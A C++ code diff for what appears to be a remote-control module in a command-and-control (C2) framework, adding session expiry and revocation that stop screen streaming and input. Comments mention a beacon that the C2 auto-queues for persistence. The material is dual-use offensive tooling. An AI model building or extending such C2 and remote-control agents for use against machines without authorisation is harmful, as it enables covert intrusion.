@@ -59,6 +59,11 @@ static int g_stream_interval_ms = 3000;
 static bool g_streaming = false;
 static int g_quality = 55;
 static unsigned long g_frame_seq = 0;
+// P0-7 session lifecycle (visible to _handle_command AND remote_main):
+// deadline in epoch seconds after which input/stream stop; revoked flag
+// makes the shutdown immediate.
+static long long g_session_deadline = 0;
+static bool g_session_revoked = false;
 
 static std::string _now_str() {
     char buf[32];
@@ -82,6 +87,24 @@ static std::string _handle_command(const std::string& command,
         // The C2 auto-queues `persist` for every new beacon. The remote
         // module is a companion agent — persistence is the beacon's job.
         return "not-applicable (persistence is the beacon's role)";
+    }
+    if (action == "session-expires") {
+        // P0-7: session expiry/revoke reaches the module. The C2 queues
+        // `session-expires <epoch-seconds>` (0 = session revoked NOW);
+        // after the deadline the module stops accepting input/streaming
+        // and exits at the next check-in (the beacon channel stays clean,
+        // the operator sees the module go offline in the task results).
+        long long epoch = 0;
+        iss >> epoch;
+        if (epoch <= 0) {
+            g_session_deadline = 0;      // revoked NOW
+            g_session_revoked = true;
+            g_streaming = false;
+            return "SESSION_REVOKED: input and streaming stop immediately";
+        }
+        g_session_deadline = epoch;
+        g_session_revoked = false;
+        return "session expiry set: " + std::to_string(epoch);
     }
     if (action == "remote") {
         std::string sub;
@@ -117,6 +140,15 @@ static std::string _handle_command(const std::string& command,
                    std::to_string(g_quality) + ")";
         }
         if (sub == "input") {
+            // P0-7: input is refused once the session is revoked or expired
+            // (deadline passed) — revocation reaches the module, not just
+            // the viewer.
+            if (g_session_revoked ||
+                (g_session_deadline > 0 &&
+                 (long long)std::time(nullptr) > g_session_deadline)) {
+                return "SESSION_EXPIRED: input refused (session revoked or "
+                       "deadline passed)";
+            }
             // internal primitive (UI forwards translated events here)
             std::string args;
             std::getline(iss >> std::ws, args);
@@ -189,6 +221,14 @@ static int remote_main(int argc, char** argv) {
     std::vector<std::pair<std::string, std::string>> pending_results;
 
     while (alive) {
+        // P0-7: enforce expiry/revocation at every loop turn.
+        if (g_session_revoked ||
+            (g_session_deadline > 0 &&
+             (long long)std::time(nullptr) > g_session_deadline)) {
+            g_streaming = false;
+            alive = false;
+            break;
+        }
         // Minimal telemetry so the C2 shows the remote session with identity.
         std::string telemetry = "{\"sysinfo\":\"Remote Session Module\\nOS: " +
                                 remote_session::mode_name() + "\"}";
